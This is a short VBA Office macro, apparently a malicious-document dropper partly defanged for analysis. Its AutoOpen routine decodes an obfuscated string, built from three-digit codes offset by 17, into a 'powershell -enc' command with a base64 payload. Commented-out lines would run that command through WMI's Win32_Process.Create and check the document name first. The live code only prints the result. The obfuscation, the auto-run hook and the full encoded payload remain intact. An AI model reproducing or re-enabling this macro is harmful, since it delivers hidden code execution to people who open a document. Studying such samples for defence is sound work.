Function int_to_char_minus_17(Beets)
    int_to_char_minus_17 = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function encrypt(Milk)
    Do
    OatMilk = OatMilk + int_to_char_minus_17(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    encrypt = OatMilk
End Function

Function Bears(Cows)
    Bears = StrReverse(Cows)
End Function

Function Tragedy()
    
    Dim Apples As String
    Dim Water As String

    'If ActiveDocument.Name <> encrypt("131134127127118131063117128116") Then
    '    Exit Function
    'End If
    
    Apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    Water = encrypt(Apples)
    Debug.Print Water   ' outputs the decrypted string to the immediate window/ debug console

    'GetObject(encrypt("136122127126120126133132075")).Get(encrypt("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin

End Function

Sub AutoOpen()
    Tragedy
End Sub